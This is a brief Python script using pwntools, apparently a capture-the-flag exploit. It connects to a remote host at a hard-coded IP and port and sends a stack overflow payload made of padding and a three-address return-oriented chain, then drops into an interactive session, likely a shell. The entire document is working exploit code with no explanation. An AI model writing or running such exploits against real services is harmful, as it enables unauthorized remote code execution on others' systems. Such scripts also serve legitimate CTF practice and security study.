from pwn import *

context(arch='amd64', os='linux')
p = remote('114.116.54.89', 10004)


payload = 'a'*0x18 + p64(0x4007d3) + p64(0x60111f) + p64(0x40075a)

p.recvline()
p.sendline(payload)

p.interactive()